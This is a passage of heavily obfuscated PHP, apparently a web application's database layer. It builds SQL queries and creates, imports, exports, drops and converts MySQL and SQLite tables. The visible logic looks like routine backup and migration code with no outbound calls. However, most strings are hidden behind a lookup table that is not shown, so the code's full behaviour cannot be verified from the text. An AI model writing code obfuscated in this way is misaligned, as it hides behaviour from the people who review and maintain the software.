(isset($àÕ­àâø[$ı¹ÂãĞÍ[363]])) { if (strpos($àÕ­àâø[$ı¹ÂãĞÍ[363]], $ı¹ÂãĞÍ[60])) { list($ı«Áà–ˆ, $ğœø¯å÷) = explode($ı¹ÂãĞÍ[60], $àÕ­àâø[$ı¹ÂãĞÍ[363]]); } else { $ı«Áà–ˆ = $àÕ­àâø[$ı¹ÂãĞÍ[363]]; } $ı«Áà–ˆ = $ı«Áà–ˆ ? $ı«Áà–ˆ : 1; $ğœø¯å÷ = isset($ğœø¯å÷) ? $ğœø¯å÷ : (is_numeric($àÕ­àâø[$ı¹ÂãĞÍ[302]]) ? $àÕ­àâø[$ı¹ÂãĞÍ[302]] : 20); $¥Ì½¨Ì = $ğœø¯å÷ * ((int) $ı«Áà–ˆ - 1); $àÕ­àâø[$ı¹ÂãĞÍ[302]] = $¥Ì½¨Ì . $ı¹ÂãĞÍ[60] . $ğœø¯å÷; } if (think_config($ı¹ÂãĞÍ[1041])) { $Œçâ—“ï = $ı¹ÂãĞÍ[1042] . md5(serialize($àÕ­àâø)); $É¼Œ£Ó = think_cache($Œçâ—“ï); if ($É¼Œ£Ó) { return $É¼Œ£Ó; } } $ĞÈ¢ı’ = $this->parseSql($this->selectSql, $àÕ­àâø); $ĞÈ¢ı’ .= $this->parseLock(isset($àÕ­àâø[$ı¹ÂãĞÍ[841]]) ? $àÕ­àâø[$ı¹ÂãĞÍ[841]] : !1); if (isset($Œçâ—“ï)) { think_cache($Œçâ—“ï, $ĞÈ¢ı’); } return $ĞÈ¢ı’; } public function parseSql($ÙıÖºÈÈ, $´€˜ÙÂÄ = array()) { $ı¨Ğ»¡ù =& $_SERVER[Å¶¨Şêº]; $ÙıÖºÈÈ = str_replace(array($ı¨Ğ»¡ù[1043], $ı¨Ğ»¡ù[1044], $ı¨Ğ»¡ù[1045], $ı¨Ğ»¡ù[1046], $ı¨Ğ»¡ù[1047], $ı¨Ğ»¡ù[1048], $ı¨Ğ»¡ù[1049], $ı¨Ğ»¡ù[1050], $ı¨Ğ»¡ù[1051], $ı¨Ğ»¡ù[1052], $ı¨Ğ»¡ù[1053]), array($this->parseTable("{$´€˜ÙÂÄ[$ı¨Ğ»¡ù[289]]}"), $this->parseDistinct(isset($´€˜ÙÂÄ[$ı¨Ğ»¡ù[1054]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[1054]] : !1), $this->parseField(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[283]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[283]] : $ı¨Ğ»¡ù[200]), $this->parseJoin(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[292]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[292]] : $ı¨Ğ»¡ù[12]), $this->parseWhere(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[285]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[285]] : $ı¨Ğ»¡ù[12]), $this->parseGroup(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[514]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[514]] : $ı¨Ğ»¡ù[12]), $this->parseHaving(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[1055]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[1055]] : $ı¨Ğ»¡ù[12]), $this->parseOrder(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[375]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[375]] : $ı¨Ğ»¡ù[12]), $this->parseLimit(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[302]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[302]] : $ı¨Ğ»¡ù[12]), $this->parseUnion(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[357]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[357]] : $ı¨Ğ»¡ù[12]), $this->parseComment(!empty($´€˜ÙÂÄ[$ı¨Ğ»¡ù[364]]) ? $´€˜ÙÂÄ[$ı¨Ğ»¡ù[364]] : $ı¨Ğ»¡ù[12])), $ÙıÖºÈÈ); return $ÙıÖºÈÈ; } public function getLastSql($ïÇàÍ¬µ = '') { return $ïÇàÍ¬µ ? $this->modelSql[$ïÇàÍ¬µ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($‰™¶Í¾Î) { return addslashes($‰™¶Í¾Î); } public function setModel($†ûˆËÜÇ) { $this->model = $†ûˆËÜÇ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($èÑÔØ× = array()) { $ü‘­áêü =& $_SERVER[Å¶¨Şêº]; if (empty($èÑÔØ×)) { $èÑÔØ× = $GLOBALS[$ü‘­áêü[6]][$ü‘­áêü[31]]; } $this->database = $èÑÔØ×; } public function model($™¹“ù” = '') { return new ModelBase($™¹“ù”, $_SERVER[Å¶¨Şêº][12], $this->database); } public function db($ÕÂàíî = false) { $ØÉÄ”í‹ =& $_SERVER[Å¶¨Şêº]; $›€”’° = array_change_key_case($this->database); if ($this->dbType() == $ØÉÄ”í‹[23] || !$ÕÂàíî) { return $this->model()->db(); } $ÊßÙœÇæ = $›€”’°[$ØÉÄ”í‹[969]]; $›€”’°[$ØÉÄ”í‹[969]] = $ØÉÄ”í‹[12]; if ($›€”’°[$ØÉÄ”í‹[964]] == $ØÉÄ”í‹[961]) { $Ü ‰·×© = $›€”’°[$ØÉÄ”í‹[970]]; $›€”’°[$ØÉÄ”í‹[970]] = substr($Ü ‰·×©, 0, strrpos($Ü ‰·×©, $ØÉÄ”í‹[1056])); } $this->database = $›€”’°; $˜¿»Ê = $this->model()->db(); try { $ß›â“« = $˜¿»Ê->execute("\x73\x68\157\x77\40\144\141\164\141\x62\141\163\x65\163\x20\x6c\151\x6b\x65\x20\47{$ÊßÙœÇæ}\x27"); } catch (Exception $’å¯„œ) { } if (!$ß›â“«) { $˜¿»Ê->execute("\x63\x72\x65\141\164\x65\x20\x64\x61\x74\141\x62\x61\x73\145\40\140{$ÊßÙœÇæ}\x60"); } $›€”’°[$ØÉÄ”í‹[969]] = $ÊßÙœÇæ; if ($›€”’°[$ØÉÄ”í‹[964]] == $ØÉÄ”í‹[961]) { $›€”’°[$ØÉÄ”í‹[970]] .= $ØÉÄ”í‹[1056] . $ÊßÙœÇæ; } $this->database = $›€”’°; $˜¿»Ê->execute("\165\163\x65\40\x60{$ÊßÙœÇæ}\140"); return $˜¿»Ê; } public function createTable($öÆº«¹Ñ, &$Ù½ó÷ù) { $ùÌ¶Ø =& $_SERVER[Å¶¨Şêº]; if (!IO::exist($öÆº«¹Ñ)) { ActionCall($ùÌ¶Ø[1057], !0, 0); show_json(LNG($ùÌ¶Ø[1058]), !1); } $­€Ó¥´ = $this->model()->db(); $û‰÷ĞÂÙ = sqlSplit(IO::getContent($öÆº«¹Ñ)); foreach ($û‰÷ĞÂÙ as $‰¡¿ÃÛÜ) { $îíÊ±ƒÑ = stripos($‰¡¿ÃÛÜ, $ùÌ¶Ø[1059]) === 0; if ($îíÊ±ƒÑ) { $Ù½ó÷ù->task[$ùÌ¶Ø[784]] += 1; } $­€Ó¥´->execute($‰¡¿ÃÛÜ); if ($îíÊ±ƒÑ) { preg_match($ùÌ¶Ø[1060], $‰¡¿ÃÛÜ, $šä®Ì¨Ç); $Ù½ó÷ù->task[$ùÌ¶Ø[1061]] = $šä®Ì¨Ç[1]; $Ù½ó÷ù->update(1); } } } public function insertTable($¶æäêê‡, &$ÈâÛÔù) { $Ö®å¼ù× =& $_SERVER[Å¶¨Şêº]; $ƒ«İ‹¬ë = $this->model()->db(); $ÃŞäİùÏ = $ÒòØĞ ª ? array($ÒòØĞ ª) : $ƒ«İ‹¬ë->getTables(); foreach ($¶æäêê‡ as $ÙûàœÉ) { $ÒòØĞ ª = basename($ÙûàœÉ, $Ö®å¼ù×[786]); if (!in_array($ÒòØĞ ª, $ÃŞäİùÏ)) { continue; } $ÈâÛÔù->task[$Ö®å¼ù×[1061]] = $ÒòØĞ ª; if (get_filesize($ÙûàœÉ) == 0) { continue; } $É˜Â‰Â³ = $this->sqlToDb($ÙûàœÉ, $ÈâÛÔù); if (!$É˜Â‰Â³) { ActionCall($Ö®å¼ù×[1057], !0, 0); show_json(LNG($Ö®å¼ù×[1062]) . "\133{$ÒòØĞ ª}\x5d", !1); } } } public function sqlFromDb($éÌæ·­µ, $‘†ÈÕ”Ø, &$¦±ì¬¾Ï, $è”¿°‡ = '') { if ($¦±ì¬¾Ï) { $¦±ì¬¾Ï->task[$_SERVER[Å¶¨Şêº][1061]] = $éÌæ·­µ; } $¥ìŠÂ¬ = $this->model($éÌæ·­µ); $è´¶‹íõ = 0; $Ô÷˜ÒÁï = 0; $›ß›§–™ = 10000; $ø”åóŸ‰ = fopen($‘†ÈÕ”Ø, $_SERVER[Å¶¨Şêº][1063]); $íÔÕÓ = $¥ìŠÂ¬->getPk(); $â–„„Ó = $¥ìŠÂ¬->getDbFields(); $ò–Ä‰›¼ = $_SERVER[Å¶¨Şêº][12]; if ($GLOBALS[$_SERVER[Å¶¨Şêº][785]] && in_array($éÌæ·­µ, array($_SERVER[Å¶¨Şêº][1064], $_SERVER[Å¶¨Şêº][1065]))) { $ò–Ä‰›¼ = $éÌæ·­µ; } do { $æç±ª¶ = array($íÔÕÓ => array($_SERVER[Å¶¨Şêº][1011], $Ô÷˜ÒÁï)); $Í›úáô = $¥ìŠÂ¬->where($æç±ª¶)->field($â–„„Ó)->order($íÔÕÓ . $_SERVER[Å¶¨Şêº][1066])->limit($›ß›§–™)->select(); $Í›úáô = !empty($Í›úáô) ? $Í›úáô : array(); if (!($Âï÷ŠüÇ = count($Í›úáô))) { break; } $š¤¹ş = end($Í›úáô); $Ô÷˜ÒÁï = $š¤¹ş[$íÔÕÓ]; $ŒÈ…¿ÀÑ = array(); foreach ($Í›úáô as $ÄÇø…øê) { if ($ò–Ä‰›¼) { if ($éÌæ·­µ == $_SERVER[Å¶¨Şêº][1064]) { if ($ÄÇø…øê[$_SERVER[Å¶¨Şêº][43]] == $_SERVER[Å¶¨Şêº][1067]) { $õñ…ƒ‰½ = json_decode($ÄÇø…øê[$_SERVER[Å¶¨Şêº][384]], !0); if ($õñ…ƒ‰½[$_SERVER[Å¶¨Şêº][42]] == $GLOBALS[$_SERVER[Å¶¨Şêº][785]] && $õñ…ƒ‰½[$_SERVER[Å¶¨Şêº][747]] != 1) { continue; } } } else { if ($ÄÇø…øê[$_SERVER[Å¶¨Şêº][43]] == $_SERVER[Å¶¨Şêº][1068] && $ÄÇø…øê[$_SERVER[Å¶¨Şêº][105]] == $_SERVER[Å¶¨Şêº][777]) { continue; } } } if ($è”¿°‡) { $ÄÇø…øê[$_SERVER[Å¶¨Şêº][95]] = "\173\x69\x6f\x3a{$è”¿°‡}\x7d" . substr($ÄÇø…øê[$_SERVER[Å¶¨Şêº][95]], strlen("\173\151\x6f\x3a{$ÄÇø…øê[$_SERVER[Å¶¨Şêº][815]]}\x7d")); $ÄÇø…øê[$_SERVER[Å¶¨Şêº][815]] = $è”¿°‡; } $ŒÈ…¿ÀÑ[] = $_SERVER[Å¶¨Şêº][1069] . $this->sqlEncode($ÄÇø…øê) . $_SERVER[Å¶¨Şêº][1070]; } $ÅËÕÁ– = "\x49\x4e\x53\x45\x52\x54\40\111\116\x54\117\x20\140{$éÌæ·­µ}\140\x20\50\x60" . implode($_SERVER[Å¶¨Şêº][1071], $â–„„Ó) . $_SERVER[Å¶¨Şêº][1072]; fwrite($ø”åóŸ‰, $ÅËÕÁ– . implode($_SERVER[Å¶¨Şêº][1073], $ŒÈ…¿ÀÑ) . $_SERVER[Å¶¨Şêº][82] . PHP_EOL); $è´¶‹íõ += $Âï÷ŠüÇ; if ($¦±ì¬¾Ï) { $¦±ì¬¾Ï->update($Âï÷ŠüÇ); } } while ($›ß›§–™ == $Âï÷ŠüÇ); fclose($ø”åóŸ‰); return $è´¶‹íõ; } public function sqlToDb($´—íè, &$ÅÒõêéƒ) { $‹ŸƒÕ…Ê =& $_SERVER[Å¶¨Şêº]; $ìâçŸó† = $this->model()->db(); $Òµ©Şò´ = @fopen($´—íè, $‹ŸƒÕ…Ê[1074]); if (!$Òµ©Şò´) { return !1; } $‡®şùÖ = 0; $ĞõĞêÕÏ = $‹ŸƒÕ…Ê[12]; $„¥»ä’ó = array(); $µˆ¶ÇÛ” = $this->dbType(); $Èò±¥‡å = $µˆ¶ÇÛ” == $‹ŸƒÕ…Ê[23] ? 500 : 2000; $•Ã¦şÚ = basename($´—íè, $‹ŸƒÕ…Ê[786]); $Õ“ƒÒ¬Ë = 0; $â´¡ù¸è = 4194304 - 104858; $‘´«Ü„´ = 1000000 - 104858; while (!feof($Òµ©Şò´)) { $š®’šÊà = trim(fgets($Òµ©Şò´)); if (!$š®’šÊà) { continue; } $¶•Äè’š = $this->sqlDecode($š®’šÊà, $µˆ¶ÇÛ”, $•Ã¦şÚ); if (stripos($¶•Äè’š, $‹ŸƒÕ…Ê[365]) === 0) { if (!$ĞõĞêÕÏ) { $ĞõĞêÕÏ = $¶•Äè’š . $‹ŸƒÕ…Ê[63]; } continue; } if ($ÅÒõêéƒ) { $ÅÒõêéƒ->task[$‹ŸƒÕ…Ê[784]] += 1; } $‡®şùÖ++; $„¥»ä’ó[] = rtrim(rtrim(trim($¶•Äè’š), $‹ŸƒÕ…Ê[60]), $‹ŸƒÕ…Ê[82]); $ÖÁÈ«õ = null; $ÓÎŞ”ºÌ = strlen($¶•Äè’š); $Õ“ƒÒ¬Ë += $ÓÎŞ”ºÌ; if ($Õ“ƒÒ¬Ë >= ($Èò±¥‡å == 500 ? $‘´«Ü„´ : $â´¡ù¸è)) { $ÖÁÈ«õ = array_pop($„¥»ä’ó); if ($‡®şùÖ > 1) { $‡®şùÖ--; } } if ($‡®şùÖ >= $Èò±¥‡å || $ÖÁÈ«õ) { $¶•Äè’š = $ĞõĞêÕÏ . implode($‹ŸƒÕ…Ê[60], $„¥»ä’ó); if (!$ìâçŸó†->execute($¶•Äè’š)) { return !1; } if ($ÅÒõêéƒ) { $ÅÒõêéƒ->update($‡®şùÖ); } $„¥»ä’ó = array(); $‡®şùÖ = 0; $Õ“ƒÒ¬Ë = 0; if ($ÖÁÈ«õ) { $„¥»ä’ó = array($ÖÁÈ«õ); $‡®şùÖ = 1; $Õ“ƒÒ¬Ë = $ÓÎŞ”ºÌ; } } } fclose($Òµ©Şò´); if (!empty($„¥»ä’ó)) { $¶•Äè’š = $ĞõĞêÕÏ . implode($‹ŸƒÕ…Ê[60], $„¥»ä’ó); if (!$ìâçŸó†->execute($¶•Äè’š)) { return !1; } if ($ÅÒõêéƒ) { $ÅÒõêéƒ->update($‡®şùÖ); } } return !0; } public function dropTable($˜İˆ¨‘¯ = null) { $õ¿ğ³Ãú = $this->model()->db(); $âùÁ§µß = $˜İˆ¨‘¯ ? array($˜İˆ¨‘¯) : $õ¿ğ³Ãú->getTables(); if (!$âùÁ§µß) { return; } foreach ($âùÁ§µß as $˜İˆ¨‘¯) { if ($˜İˆ¨‘¯) { $˜İˆ¨‘¯ = strtolower($˜İˆ¨‘¯); } else { continue; } $õ¿ğ³Ãú->execute("\144\162\x6f\x70\x20\164\141\x62\x6c\145\x20\x69\146\x20\x65\170\151\163\164\x73\40\140{$˜İˆ¨‘¯}\x60"); } } private function sqlEncode($à—•Í®) { $ÂüÙİ’‚ =& $_SERVER[Å¶¨Şêº]; $ìŸõ÷¹” = array(); foreach ($à—•Í® as $Ó†­î¸Ğ) { if (is_array($Ó†­î¸Ğ)) { $Ó†­î¸Ğ = json_encode_force($Ó†­î¸Ğ); } $Ó†­î¸Ğ = addslashes($Ó†­î¸Ğ); $Ó†­î¸Ğ = str_replace(array($ÂüÙİ’‚[1075], $ÂüÙİ’‚[19]), array($ÂüÙİ’‚[1076], $ÂüÙİ’‚[1077]), $Ó†­î¸Ğ); $ìŸõ÷¹”[] = str_replace($ÂüÙİ’‚[68], $ÂüÙİ’‚[1078], $Ó†­î¸Ğ); } return $ÂüÙİ’‚[68] . implode($ÂüÙİ’‚[1079], $ìŸõ÷¹”) . $ÂüÙİ’‚[68]; } private function sqlDecode($¨ÑÕÌşŠ, $İó‘÷·Á, $êî‡“§½ = '') { $†–ÈŞ• =& $_SERVER[Å¶¨Şêº]; $¨ÑÕÌşŠ = str_replace(array($†–ÈŞ•[1076], $†–ÈŞ•[1077]), array($†–ÈŞ•[1075], $†–ÈŞ•[19]), $¨ÑÕÌşŠ); if ($İó‘÷·Á == $†–ÈŞ•[23]) { return $êî‡“§½ != $†–ÈŞ•[1080] ? stripslashes($¨ÑÕÌşŠ) : $¨ÑÕÌşŠ; } if ($êî‡“§½ == $†–ÈŞ•[1080]) { $¨ÑÕÌşŠ = str_replace($†–ÈŞ•[1081], $†–ÈŞ•[129], stripslashes($¨ÑÕÌşŠ)); } return $¨ÑÕÌşŠ; } public function getSqlFile($Ì‹à­Ü· = '') { $–„öÈâ =& $_SERVER[Å¶¨Şêº]; $Æ®Å•éŸ = $this->dbType(!0); $€Åçùò§ = CONTROLLER_DIR . "\151\x6e\x73\164\x61\154\x6c\x2f\144\x61\164\141\x2f{$Æ®Å•éŸ}\56\163\161\154"; $€’·» = file_get_contents($€Åçùò§); $ÖóøÅê¶ = $–„öÈâ[1082] . ($Æ®Å•éŸ == $–„öÈâ[802] ? $–„öÈâ[1083] : $–„öÈâ[1084]) . $–„öÈâ[1085]; preg_match_all($ÖóøÅê¶, $€’·», $Ãê¯¥”ê); $…ö¿ÇÖË = $Ãê¯¥”ê[1]; $¸–™ö»Ü = $this->model()->db(); $úøö³é = $¸–™ö»Ü->getTables(); $‚”•öşà = TEMP_FILES . $–„öÈâ[1086] . date($–„öÈâ[748]) . $–„öÈâ[8]; del_dir($‚”•öşà); mk_dir($‚”•öşà); $¶­æñ º = $‚”•öşà . $–„öÈâ[1087]; $˜”ÄÊÜÜ = $‚”•öşà . $–„öÈâ[1088]; $¯¡çÅò = $Æ®Å•éŸ == $–„öÈâ[23] ? $–„öÈâ[802] : $–„öÈâ[23]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\x61\154\x6c\x2f\144\141\x74\141\57{$¯¡çÅò}\x2e\163\161\x6c", $‚”•öşà); @touch($‚”•öşà . $Æ®Å•éŸ . $–„öÈâ[786]); $„²²©¬ = fopen($¶­æñ º, $–„öÈâ[1063]); $†’â•Àç = fopen($˜”ÄÊÜÜ, $–„öÈâ[1063]); if ($Æ®Å•éŸ == $–„öÈâ[23]) { $úøö³é = array_diff($úøö³é, array($–„öÈâ[782], $–„öÈâ[783])); $ØøÎÓØª = array($–„öÈâ[1089], $–„öÈâ[1090], $–„öÈâ[1091]); fwrite($†’â•Àç, implode(PHP_EOL, $ØøÎÓØª) . PHP_EOL . PHP_EOL); foreach ($úøö³é as $†ò©¨¥ğ) { $ å›¹ë = $this->sqlFromSqlite($†ò©¨¥ğ); if (!$ å›¹ë[$–„öÈâ[23]]) { continue; } fwrite($†’â•Àç, $ å›¹ë[$–„öÈâ[23]] . PHP_EOL . PHP_EOL); if (!in_array($†ò©¨¥ğ, $…ö¿ÇÖË)) { fwrite($„²²©¬, $ å›¹ë[$–„öÈâ[802]] . PHP_EOL . PHP_EOL); } } } else { foreach ($úøö³é as $†ò©¨¥ğ) { $ å›¹ë = $this->sqlFromMysql($†ò©¨¥ğ); if (!$ å›¹ë[$–„öÈâ[802]]) { continue; } fwrite($„²²©¬, $ å›¹ë[$–„öÈâ[802]] . PHP_EOL . PHP_EOL); if (!in_array($†ò©¨¥ğ, $…ö¿ÇÖË)) { fwrite($†’â•Àç, $ å›¹ë[$–„öÈâ[23]] . PHP_EOL . PHP_EOL); } } } fclose($„²²©¬); fclose($†’â•Àç); $€’·» = array($–„öÈâ[802] => $¶­æñ º, $–„öÈâ[23] => $˜”ÄÊÜÜ); return $Ì‹à­Ü· ? $€’·»[$Ì‹à­Ü·] : $€’·»; } public function dbType($™éÍ¥ì = false) { $¿‚ïµ© =& $_SERVER[Å¶¨Şêº]; $òÊÒÂ»© = $™éÍ¥ì ? $GLOBALS[$¿‚ïµ©[6]][$¿‚ïµ©[31]] : $this->database; $òÊÒÂ»© = array_change_key_case($òÊÒÂ»©); $Ùà“½ä¿ = $òÊÒÂ»©[$¿‚ïµ©[964]]; if ($Ùà“½ä¿ == $¿‚ïµ©[961]) { $²¤™œŸú = explode($¿‚ïµ©[4], $òÊÒÂ»©[$¿‚ïµ©[970]]); $Ùà“½ä¿ = $²¤™œŸú[0]; } $Ô¨›»İ = array($¿‚ïµ©[1092] => $¿‚ïµ©[23], $¿‚ïµ©[909] => $¿‚ïµ©[802]); if (isset($Ô¨›»İ[$Ùà“½ä¿])) { $Ùà“½ä¿ = $Ô¨›»İ[$Ùà“½ä¿]; } return $Ùà“½ä¿; } public function sqlFromMysql($Œû£·ªÏ, $œòåñ«– = '') { $òšëİùÍ =& $_SERVER[Å¶¨Şêº]; $‚Ì¡§ö“ = $this->model()->db(); $İºÇó‰£ = $‚Ì¡§ö“->query($òšëİùÍ[1093] . $Œû£·ªÏ . $òšëİùÍ[394]); if (!$İºÇó‰£ || !$İºÇó‰£[0]) { return !1; } $¢áƒ¸±Õ = _get($İºÇó‰£[0], $òšëİùÍ[1094], $òšëİùÍ[12]); if (!$¢áƒ¸±Õ) { return !1; } $­ äÉûß = "\104\122\x4f\x50\x20\124\101\102\x4c\105\x20\x49\106\40\x45\130\x49\123\124\123\x20\x60{$Œû£·ªÏ}\x60\73" . PHP_EOL . $¢áƒ¸±Õ . $òšëİùÍ[82]; if ($œòåñ«– && $œòåñ«– == $òšëİùÍ[802]) { return $­ äÉûß; } $Ç°ó™—Ô = array_change_key_case($GLOBALS[$òšëİùÍ[6]][$òšëİùÍ[31]]); $œõ´Ş‚ = $Ç°ó™—Ô[$òšëİùÍ[969]]; $â‚û¶ÑÛ = $òšëİùÍ[1095] . $œõ´Ş‚ . $òšëİùÍ[1096] . $Œû£·ªÏ . $òšëİùÍ[68]; $œùÂÒœ = $òšëİùÍ[1097] . $Œû£·ªÏ . $òšëİùÍ[897]; $Æ”äËŞâ = $‚Ì¡§ö“->query($â‚û¶ÑÛ); if (empty($Æ”äËŞâ)) { $ûº–Äâ½ = array($òšëİùÍ[802] => $òšëİùÍ[12], $òšëİùÍ[23] => $òšëİùÍ[12]); return $œòåñ«– ? $ûº–Äâ½[$œòåñ«–] : $ûº–Äâ½; } $å˜¸î = $‚Ì¡§ö“->query($œùÂÒœ); $«„Ê§’ = $òšëİùÍ[12]; $İú¹íÜ = array(); foreach ($å˜¸î as $·¦ôø•Ö) { if (!$«„Ê§’ && $·¦ôø•Ö[$òšëİùÍ[1098]] == $òšëİùÍ[1099]) { $«„Ê§’ = $·¦ôø•Ö[$òšëİùÍ[1100]]; } if (isset($İú¹íÜ[$·¦ôø•Ö[$òšëİùÍ[1098]]])) { $İú¹íÜ[$·¦ôø•Ö[$òšëİùÍ[1098]]][$òšëİùÍ[1101]][] = $·¦ôø•Ö[$òšëİùÍ[1100]]; continue; } $İú¹íÜ[$·¦ôø•Ö[$òšëİùÍ[1098]]] = array($òšëİùÍ[1102] => $·¦ôø•Ö[$òšëİùÍ[1098]], $òšëİùÍ[1101] => array($·¦ôø•Ö[$òšëİùÍ[1100]]), $òšëİùÍ[1103] => $·¦ôø•Ö[$òšëİùÍ[1104]] == $òšëİùÍ[99] ? 0 : 1); } $ÌèøÑÆĞ = array(); foreach ($İú¹íÜ as $·¦ôø•Ö) { $¬…Ñƒ = $·¦ôø•Ö[$òšëİùÍ[1102]] == $òšëİùÍ[1099]; $­¡«ú²Á = array($òšëİùÍ[1105], $·¦ôø•Ö[$òšëİùÍ[1103]] == $òšëİùÍ[99] && !$¬…Ñƒ ? $òšëİùÍ[1106] : $òšëİùÍ[12], $òšëİùÍ[1107], $òšëİùÍ[1108] . $Œû£·ªÏ . $òšëİùÍ[11] . ($¬…Ñƒ ? $òšëİùÍ[1109] : $·¦ôø•Ö[$òšëİùÍ[1102]]) . $òšëİùÍ[129], $òšëİùÍ[1110], $òšëİùÍ[129] . $Œû£·ªÏ . $òšëİùÍ[129], $òšëİùÍ[1111] . implode($òšëİùÍ[1112], $·¦ôø•Ö[$òšëİùÍ[1101]]) . $òšëİùÍ[1113]); $ÌèøÑÆĞ[] = implode($òšëİùÍ[63], $­¡«ú²Á) . $òšëİùÍ[82]; } $›€§ ´ = array(); $¬âˆªğ = array($òšëİùÍ[1114] => $òšëİùÍ[1115], $òšëİùÍ[1115] => $òšëİùÍ[1115], $òšëİùÍ[298] => $òšëİùÍ[325], $òšëİùÍ[297] => $òšëİùÍ[325]); foreach ($Æ”äËŞâ as $·¦ôø•Ö) { $­¡«ú²Á = array($òšëİùÍ[129] . $·¦ôø•Ö[$òšëİùÍ[1116]] . $òšëİùÍ[129], isset($¬âˆªğ[$·¦ôø•Ö[$òšëİùÍ[1117]]]) ? $¬âˆªğ[$·¦ôø•Ö[$òšëİùÍ[1117]]] : $·¦ôø•Ö[$òšëİùÍ[1118]], $·¦ôø•Ö[$òšëİùÍ[1119]] == $òšëİùÍ[895] ? $òšëİùÍ[1120] : $òšëİùÍ[1121], $·¦ôø•Ö[$òšëİùÍ[1116]] == $«„Ê§’ ? $òšëİùÍ[1122] : $òšëİùÍ[12], $·¦ôø•Ö[$òšëİùÍ[946]] ? strtoupper(str_replace($òšëİùÍ[11], $òšëİùÍ[12], $·¦ôø•Ö[$òšëİùÍ[946]])) : $òšëİùÍ[12]); $›€§ ´[] = trim(implode($òšëİùÍ[63], $­¡«ú²Á)); } $õè´†Ì· = array($òšëİùÍ[1123] . $Œû£·ªÏ . $òšëİùÍ[1124], $òšëİùÍ[1125] . $Œû£·ªÏ . $òšëİùÍ[1126], implode($òšëİùÍ[60] . PHP_EOL, $›€§ ´), $òšëİùÍ[943]); $Ì«ËÈŞ¡ = implode(PHP_EOL, array_merge($õè´†Ì·, $ÌèøÑÆĞ)); if ($œòåñ«– && $œòåñ«– == $òšëİùÍ[23]) { return $Ì«ËÈŞ¡; } $ûº–Äâ½ = array($òšëİùÍ[802] => $­ äÉûß, $òšëİùÍ[23] => $Ì«ËÈŞ¡); return $œòåñ«– ? $ûº–Äâ½[$œòåñ«–] : $ûº–Äâ½; } public function sqlFromSqlite($Ú¼•€ÔÃ, $äû §ŸÉ = '') { $›íî‹ =& $_SERVER[Å¶¨Şêº]; $ƒÂöŞ° = $this->model()->db(); $Ì‡”¡ä‹ = "\x50\122\101\x47\115\101\x20\x54\x41\x42\114\x45\x5f\111\x4e\x46\x4f\40\50\x27{$Ú¼•€ÔÃ}\47\51"; $Êà×ÅÔ› = "\123\105\x4c\x45\103\x54\x20\x2a\x20\106\122\117\115\40\x73\x71\154\x69\164\145\x5f\155\x61\x73\164\x65\162\x20\x57\110\105\x52\x45\x20\164\x62\154\137\x6e\141\155\145\40\75\x20\47{$Ú¼•€ÔÃ}\x27"; $ÛÛ’¥ø€ = $ƒÂöŞ°->query($Ì‡”¡ä‹); if (empty($ÛÛ’¥ø€)) { $Á¯—¨ Ï = array($›íî‹[802] => $›íî‹[12], $›íî‹[23] => $›íî‹[12]); return $äû §ŸÉ ? $Á¯—¨ Ï[$äû §ŸÉ] : $Á¯—¨ Ï; } $ÉÏçùÖÜ = $ƒÂöŞ°->query($Êà×ÅÔ›); $¹èºŠßÚ = $ûçÏ„œ§ = array(); foreach ($ÉÏçùÖÜ as $üìîÖ“â) { if ($üìîÖ“â[$›íî‹[43]] == $›íî‹[289]) { $¹èºŠßÚ[] = $üìîÖ“â[$›íî‹[1127]]; } else { $ûçÏ„œ§[$üìîÖ“â[$›íî‹[42]]] = $üìîÖ“â[$›íî‹[1127]]; } } $©ì¿Ö… = array_merge(array($›íî‹[1123] . $Ú¼•€ÔÃ . $›íî‹[129]), $¹èºŠßÚ, array_values($ûçÏ„œ§)); $©ì¿Ö… = implode($›íî‹[82] . PHP_EOL, $©ì¿Ö…) . $›íî‹[82]; if ($äû §ŸÉ && $äû §ŸÉ == $›íî‹[23]) { return $©ì¿Ö…; } $ëÁ·Å²Â = array(); $èİáîè = array($›íî‹[1115] => $›íî‹[1128], $›íî‹[325] => $›íî‹[1129]); $ÈĞ—ªƒ = $›íî‹[12]; foreach ($ÛÛ’¥ø€ as $üìîÖ“â) { if ($üìîÖ“â[$›íî‹[67]] == $›íî‹[99]) { $ÈĞ—ªƒ = $üìîÖ“â[$›íî‹[42]]; } $İº†™àâ = array($›íî‹[394] . $üìîÖ“â[$›íî‹[42]] . $›íî‹[394], isset($èİáîè[$üìîÖ“â[$›íî‹[43]]]) ? $èİáîè[$üìîÖ“â[$›íî‹[43]]] : $üìîÖ“â[$›íî‹[43]], $üìîÖ“â[$›íî‹[45]] == $›íî‹[99] ? $›íî‹[1120] : $›íî‹[1130] . $üìîÖ“â[$›íî‹[66]], $üìîÖ“â[$›íî‹[67]] == $›íî‹[99] ? $›íî‹[1131] : $›íî‹[12]); $ëÁ·Å²Â[] = trim(implode($›íî‹[63], $İº†™àâ)); } foreach ($ûçÏ„œ§ as $Ä…ÛÅ¦õ => $·ã·×¥) { $çŸ›«³ = str_replace($›íî‹[1132] . $Ú¼•€ÔÃ . $›íî‹[11], $›íî‹[12], $Ä…ÛÅ¦õ); $Ÿ÷„¬Ôî = str_replace(array($›íî‹[129], $›íî‹[954]), $›íî‹[394], substr($·ã·×¥, stripos($·ã·×¥, $›íî‹[270]))); if ($çŸ›«³ == $›íî‹[1109]) { $Å×šĞö  = 